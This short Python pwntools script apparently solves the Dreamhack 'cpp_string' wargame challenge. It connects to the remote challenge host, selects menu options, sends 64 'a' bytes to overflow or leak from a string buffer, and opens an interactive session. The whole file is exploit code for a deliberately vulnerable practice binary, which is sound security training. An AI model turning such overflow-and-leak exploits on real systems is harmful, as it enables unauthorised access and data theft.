#!/usr/bin/env python3
from pwn import *
exe = ELF('cpp_string', checksec = False)

# p = process(exe.path)
p = remote('host8.dreamhack.games', 12398)

p.sendlineafter(b'input : ', b'2')
p.sendlineafter(b'contents : ', b'a'*64)
p.sendlineafter(b'input : ', b'1')
p.sendlineafter(b'input : ', b'3')


p.interactive()